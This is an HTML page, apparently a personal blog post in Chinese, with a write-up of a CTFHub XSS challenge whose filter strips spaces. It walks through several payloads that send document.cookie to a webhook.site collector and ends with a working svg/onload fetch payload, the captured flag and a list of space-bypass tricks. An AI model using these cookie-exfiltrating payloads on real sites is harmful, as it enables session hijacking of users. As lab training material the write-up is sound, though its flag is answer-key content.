@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-XSS过滤空格 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-XSS过滤空格 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.23 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, XSS, 空格过滤, Webhook, OOB</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - XSS / 过滤空格</li>
+        <li><strong>题目名称：</strong>过滤空格</li>
+        <li><strong>提示：</strong>页面提供修改名称的功能，后端会过滤输入中的所有空格字符。目标是在无空格条件下构造有效的Payload，使Bot端执行并外带Cookie。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>空格过滤的绕过原理：</strong>在HTML和JavaScript中，空格起着分隔作用。我们可以利用斜杠 <code>/</code> 替代HTML标签属性间的空格，利用单单词函数（如 <code>fetch</code>）替代带空格的函数（如 <code>new Image()</code>），从而在无空格的环境下维持代码的语法正确性。</p >
+    <p><strong>Bot端执行环境限制（核心难点）：</strong>机器人（Bot）通常在无头浏览器中运行，带有严格的防御策略（如内容安全策略 CSP）和特定的行为检测。它可能会拦截跨域请求、阻止页面发生非预期的重定向跳转，或因为JavaScript的细微语法错误而直接中断执行。</p >
+    <p><strong>颜色对应规则说明：</strong></p >
+    <ul>
+        <li><span style="color: red; font-weight: bold;">红色</span>：靶场造成的过滤或Bot端环境触发的拦截与语法崩溃。</li>
+        <li><span style="color: orange; font-weight: bold;">橙色</span>：Payload中导致Bot端执行失败的错误写法。</li>
+        <li><span style="color: green; font-weight: bold;">绿色</span>：最终成功绕过限制、完美适配Bot端的Payload写法。</li>
+    </ul>
+
+    <h2>3. 操作步骤（含试错过程）</h2>
+    
+    <p><strong>第一步：探测与验证漏洞</strong></p >
+    <p>在输入框输入标准Payload验证过滤机制：</p >
+    <pre><code>&lt;img src=x onerror=alert(1)&gt;</code></pre>
+    <p>提交后无反应。按F12查看网页源码，发现空格被<span style="color: red;">直接删除</span>，标签变成了 <code>&lt;imgsrc=xonerror=alert(1)&gt;</code>。</p >
+
+    <p><strong>第二步：尝试使用斜杠替代HTML空格（Bot端执行失败）</strong></p >
+    <p>使用斜杠 <code>/</code> 替代HTML空格，构造外带Payload：</p >
+    <pre><code>&lt;img/src=x/onerror="new Image().src='https://webhook.site/.../?c='+document.cookie"&gt;</code></pre>
+    <p>提交后网页出现破图图标（onerror触发），将此URL发送给Bot提示 <code>Successfully</code>，但Webhook未收到请求。</p >
+    <p>原因分析：靶场不仅过滤HTML空格，也过滤了JavaScript内部的空格。Bot解析代码时，<code>new Image()</code> 被解析为 <code>newImage()</code>，触发<span style="color: red;">语法错误（SyntaxError）</span>，导致代码中断，未能执行网络请求。</p >
+
+    <p><strong>第三步：尝试 location 跳转外带（Bot端执行失败）</strong></p >
+    <p>使用 <code>location.href</code> 替代 <code>new Image()</code> 以规避内部空格：</p >
+    <pre><code>&lt;img/src=x/onerror=location.href='//webhook.site/.../?c='+document.cookie&gt;</code></pre>
+    <p>发送给Bot后，Webhook依旧无记录。</p >
+    <p>原因分析：无头浏览器通常具有严格的安全策略。使用 <code>location.href</code> 会迫使 Bot 发生页面跳转，这种行为往往会被 Bot 拦截，或者导致 Bot 的执行上下文被销毁，请求未能发出。</p >
+
+    <p><strong>第四步：尝试无引号编码外带（Bot端执行失败）</strong></p >
+    <p>尝试使用 <code>String.fromCharCode</code> 编码规避所有引号与空格：</p >
+    <pre><code>&lt;img/src=x/onerror=fetch(String.fromCharCode(104,116,116,112,115,58,47...)+document.cookie)&gt;</code></pre>
+    <p>Bot端执行后，Webhook依然无记录。</p >
+    <p>原因分析：虽然这段代码语法正确，但庞大复杂的编码可能导致Bot端浏览器请求被CSP（内容安全策略）拦截，或者代码在Bot特定的沙盒环境中被解析器丢弃。</p >
+
+    <p><strong>第五步：使用静默精简Payload（成功）</strong></p >
+    <p>改用单单词函数 <code>fetch</code> 避免内部空格，使用 <code>//</code> 和 <code>c=</code> 简化参数，构造最终Payload：</p >
+    <pre><code>&lt;svg/onload="fetch('//webhook.site/44f4f857-1f6f-4e34-bde8-2b92b25b7689/?c='+document.cookie)"&gt;</code></pre>
+    <p>此Payload使用了<span style="color: green;">斜杠</span>代替HTML空格，<span style="color: green;">fetch</span>函数避免JS内部空格，<span style="color: green;">// 和 c=</span>极大精简了URL长度。</p >
+    <p>提交后发送给Bot，Webhook成功收到带有Flag的请求：</p >
+    <pre><code>ctfhub{f9688a80448a38a07e2e0c05}</code></pre>
+    <p>提交至CTFHub，通关成功。</p >
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：HTML标签属性空格被过滤。</strong>导致 <code>&lt;img src=x&gt;</code> 变成 <code>&lt;imgsrc=x&gt;</code>，无法解析。解决办法是使用斜杠 <code>/</code> 替代。</li>
+        <li><strong>坑2：JavaScript语法内部空格被过滤。</strong>导致 <code>new Image()</code> 变成 <code>newImage()</code>，触发JS语法错误。解决办法是使用单单词函数 <code>fetch()</code>。</li>
+        <li><strong>坑3：Bot端对跳转行为的拦截。</strong>使用 <code>location.href</code> 会导致页面跳转，被Bot的安全策略拦截，或因为跳转丢失执行上下文而失败。应使用 <code>fetch</code> 进行静默请求。</li>
+        <li><strong>坑4：Bot端对复杂/跨域请求的拦截。</strong>复杂的Payload（如编码混淆）或触发跨域请求时，可能被Bot的CSP策略阻止。应使用精简、标准的语法。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>空格绕过手段：</strong>替代空格的常用符号包括斜杠 <code>/</code>、注释 <code>/**/</code>、换行符 <code>%0a</code> 和制表符 <code>%09</code>。</li>
+        <li><strong>适配Bot环境的外带技巧：</strong>优先使用静默请求函数 <code>fetch()</code>，尽量避免使用会引发页面跳转的 <code>location.href</code>。</li>
+        <li><strong>精简与去混淆：</strong>使用 <code>//webhook.site</code> 替代 <code>https://webhook.site</code>，使用 <code>c=</code> 替代 <code>cookie=</code>，精简的代码不仅便于阅读，更能减少在各个传输环节中被拦截的概率。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
